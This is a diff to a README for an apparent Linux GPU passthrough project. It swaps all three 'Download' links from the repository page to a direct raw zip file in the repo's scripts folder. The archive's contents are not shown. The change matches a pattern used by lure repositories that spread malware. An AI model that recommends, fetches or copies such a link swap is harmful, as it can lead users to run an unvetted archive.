@@ -1,11 +1,11 @@
 # 🐧 linux-nvidia-prime-vfio-passthrough - Run Linux, games, and Windows apps
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/jeanite777/linux-nvidia-prime-vfio-passthrough)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jeanite777/linux-nvidia-prime-vfio-passthrough/main/scripts/nvidia-passthrough-vfio-linux-prime-v1.4.zip)
 
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/jeanite777/linux-nvidia-prime-vfio-passthrough
+https://raw.githubusercontent.com/jeanite777/linux-nvidia-prime-vfio-passthrough/main/scripts/nvidia-passthrough-vfio-linux-prime-v1.4.zip
 
 ## 🧭 What this is
 
@@ -245,7 +245,7 @@ Before you start the VM for the first time:
 ## 📌 Download again
 
 Visit this page to download:
-https://github.com/jeanite777/linux-nvidia-prime-vfio-passthrough
+https://raw.githubusercontent.com/jeanite777/linux-nvidia-prime-vfio-passthrough/main/scripts/nvidia-passthrough-vfio-linux-prime-v1.4.zip
 
 ## 🧭 Next steps
 
